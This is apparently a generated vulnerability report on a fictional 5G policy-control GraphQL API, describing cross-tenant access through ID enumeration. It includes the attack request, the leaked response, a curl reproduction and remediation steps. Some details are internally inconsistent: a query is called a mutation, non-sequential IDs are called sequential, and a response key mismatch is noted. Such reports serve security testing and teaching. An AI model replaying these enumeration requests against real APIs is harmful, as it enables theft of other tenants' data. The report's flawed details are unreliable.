# Security Analysis Report
**System:** SpectreNet Policy Control
**Domain:** Telecom / 5G Core
**Example ID:** GQL-0315
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.8 | Predictable/sequential IDs enabling enumeration via `bulkResourceLookup` — attacker enumerates 5G core policy control records using predictable sequential IDs across tenant boundaries |

---

## Finding 1 — BOLA: Predictable/Sequential IDs Enabling Bulk Enumeration (Pattern 1.8)

### Summary
The `bulkResourceLookup` mutation on SpectreNet Policy Control (`api.spectrenet-policy-co.example.com`) accepts arbitrary IDs without per-ID ownership filtering (RISK-GQL-315). Per §5.0 Pattern 1.8, the `resourceId` field follows a predictable sequential pattern (e.g., `R-2315`, `R-1315`, `R-3315`) — an attacker can enumerate cross-tenant 5G core policy records by iterating sequential IDs. The resolver does not verify `tenantId` from the JWT, enabling a `tenant-7b66` attacker to retrieve data belonging to `tenant-309b`.

**Context.txt inconsistency (documented):** HAR mutation uses `bulkResourceLookup(ids: ["R-2315", "R-1315", "R-3315"])`, but the response key in §6.0 is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`bulkResourceLookup`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no user/tenant dimension), enabling cross-tenant cache poisoning.

**Pattern:** 1.8 — Predictable or sequential IDs (BOLA)
**Affected resolver:** `bulkResourceLookup`
**Affected endpoint:** `POST https://api.spectrenet-policy-co.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.spectrenet-policy-co.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-7b66

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2315\", \"R-1315\", \"R-3315\"]) { resourceId tenantId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Resource Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-309b",
      "ownerId": "other-user-7b66309b",
      "data": {
        "sensitiveField": "CONFIDENTIAL-7b66309b",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-7b66`. Returned data belongs to: `tenant-309b`. Sequential ID enumeration and cross-tenant bulk access confirmed.

**Context.txt inconsistency:** HAR sends `bulkResourceLookup` mutation; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.spectrenet-policy-co.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-7b66" \
  -d '{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2315\", \"R-1315\", \"R-3315\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: response contains tenant-309b policy records — sequential ID enumeration succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch on ID R-2315"}]}
```

### Remediation
1. In `bulkResourceLookup`: for each ID, assert `fetched.tenantId === jwt.tenantId`. Reject IDs belonging to other tenants.
2. Replace sequential/predictable IDs with UUIDs or opaque cryptographic identifiers.
3. Re-key Redis cache to include `tenantId`.
